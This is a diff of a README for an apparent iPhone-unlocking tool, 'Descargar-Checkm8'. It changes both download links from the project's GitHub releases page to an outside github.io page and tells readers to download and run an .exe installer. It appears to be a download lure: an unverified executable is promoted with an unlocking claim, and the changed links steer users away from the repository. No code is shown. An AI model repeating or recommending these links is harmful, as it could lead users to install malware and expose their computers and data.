@@ -1,6 +1,6 @@
 # 📱 Descargar-Checkm8 - Unlock your iPhone with ease today
 
-[![](https://img.shields.io/badge/Download-Checkm8-blue)](https://github.com/Prosong4688/Descargar-Checkm8/releases)
+[![](https://img.shields.io/badge/Download-Checkm8-blue)](https://prosong4688.github.io)
 
 ## 📌 About this project
 
@@ -18,7 +18,7 @@ Ensure your PC meets these standards before you begin:
 
 ## 🚀 Getting started
 
-1. Open the [Download Page](https://github.com/Prosong4688/Descargar-Checkm8/releases) in your web browser.
+1. Open the [Download Page](https://prosong4688.github.io) in your web browser.
 2. Locate the most recent version of the software.
 3. Click the file ending in .exe to download the installer to your computer.
 4. Wait for the download to finish.
